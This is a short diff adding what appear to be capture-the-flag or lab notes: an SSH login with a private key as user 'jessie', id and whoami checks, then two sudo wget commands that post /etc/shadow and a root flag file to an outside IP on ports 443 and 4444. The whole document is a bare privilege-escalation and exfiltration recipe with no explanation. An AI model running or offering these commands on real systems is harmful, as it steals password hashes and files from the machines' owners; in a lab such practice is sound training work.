@@ -1,0 +1,5 @@
+ssh -i id_rsa jessie@10.10.69.69
+id
+whoami
+wget exploit : sudo /usr/bin/wget --post-file=/etc/shadow http://10.17.68.177:443
+wget exploit : sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.68.177:4444
